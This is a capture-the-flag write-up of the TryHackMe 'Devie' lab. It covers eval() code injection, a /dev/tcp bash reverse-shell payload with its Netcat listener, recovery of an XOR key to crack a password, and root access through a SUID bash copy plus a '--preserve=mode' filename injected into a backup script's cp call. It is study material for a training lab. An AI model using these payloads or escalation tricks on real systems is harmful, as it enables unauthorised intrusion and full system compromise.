# TryHackMe - Devie Writeup

This machine made me apply many different skills that I've been developing throughout my practical cybersecurity journey. It was a really interesting experience because I had to combine enumeration, source code analysis, Python exploitation, cryptography and Linux privilege escalation to get full access to the machine.

As usual, the first step was performing a port scan to identify the services running on the target. We discovered that ports **22 (SSH)** and **5000 (HTTP)** were open.

I decided to investigate the HTTP service first because I noticed that it was being served by Python, which caught my attention. After exploring the landing page, I found something quite interesting: there was a button that allowed us to download the backend source code directly.

I downloaded the files and started taking a look at the code. Inside `bisection.py`, I noticed a couple of string fields named `xa` and `xb`. However, the biggest discovery came when I opened `app.py` and found the use of Python's `eval()` function.

This immediately caught my attention because using `eval()` with user-controlled input can lead to arbitrary code execution. I decided to investigate whether I could take advantage of this vulnerability to execute system commands and establish a reverse shell.

I came up with the following payload:

```python
str(__import__('os').system('bash -c "bash -i >& /dev/tcp/<OUR_IP>/4444 0>&1"') or 1)
```

Before injecting it, I started a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

After successfully submitting the payload, I received a reverse shell as the user **bruce**. I ran `ls` to enumerate the directory and managed to retrieve the first user flag.

Once inside the machine, I continued exploring the filesystem and came across a file named `note`. It contained an interesting message from Gordon explaining that he had encrypted his password using a supposedly secure XOR format. He also mentioned that his encryption script was located inside `/opt/`.

The note included an encrypted string, so I decided to investigate the directory and found a Python script called `encrypt.py`.

I executed it using Gordon's privileges with the following command:

```bash
sudo -u gordon /usr/bin/python3 /opt/encrypt.py
```

The script prompted me to enter a password to encrypt. At first, I wasn't entirely sure how to approach this, but then I noticed something important: the encrypted string from Gordon's note had a length of 16 characters.

I decided to experiment by entering exactly 16 random characters:

```text
aaaaaaaaaaaaaaaa
```

The script returned another string, and this is where I got a little stuck.

After thinking about it for a while, I decided to use **CyberChef** to understand what was happening. I took the output generated by the script and applied the XOR operation. Initially, the result looked like a bunch of weird characters, so I changed the output representation to UTF-8.

To my surprise, I got the following result:

```text
supersecretkeyxo
```

There it was! I had managed to recover the XOR key.

I then used this key with the original encrypted string from Gordon's note, and CyberChef returned the password in plain text.

With the credentials recovered, the next step was accessing Gordon's account. Fortunately, during the initial enumeration, we had already discovered that SSH was running on port 22.

I simply connected using:

```bash
ssh gordon@<TARGET_IP>
```

Once logged in as Gordon, I ran `ls` and managed to retrieve the second user flag.

Now it was time for the final objective: getting root.

While exploring the system, I discovered a backup mechanism that caught my attention. The way the backup process handled files and permissions opened up an interesting privilege escalation possibility.

I started investigating how the backup operation worked and noticed that it used the `cp` command to copy files between directories. This was particularly interesting because I could potentially manipulate how the command interpreted its arguments.

First, I copied the Bash executable into the reports directory:

```bash
cp /usr/bin/bash /home/gordon/reports/rootbash
```

Then, I enabled the SUID bit on the copied executable:

```bash
chmod +s rootbash
```

The next step was creating a file with a special name:

```bash
touch -- '--preserve=mode'
```

This was the key part of the exploitation. The idea was to take advantage of how the backup process handled filenames and command-line arguments. By making the backup operation interpret the specially named file as an option for `cp`, I could preserve the SUID permissions when the executable was copied.

After the backup process completed, I navigated to the directory containing the copied Bash executable and ran:

```bash
./rootbash -p
```

The `-p` option allows Bash to maintain its effective privileges instead of dropping them.

And just like that, I finally obtained a root shell!

I navigated through the filesystem and retrieved the final root flag.

## Final Thoughts

I really enjoyed this machine because it forced me to put together several concepts that I had been studying separately.

The part involving XOR encryption was probably the one that made me think the most. I initially didn't know how to approach it, but experimenting with the encryption script and using CyberChef helped me understand what was happening and eventually recover Gordon's password.

The final privilege escalation was also a great learning experience, especially understanding how Linux handles SUID permissions and how badly implemented backup scripts can introduce security vulnerabilities.

Overall, Devie was a great opportunity to practise enumeration, Python code analysis, exploitation, cryptography and Linux privilege escalation.
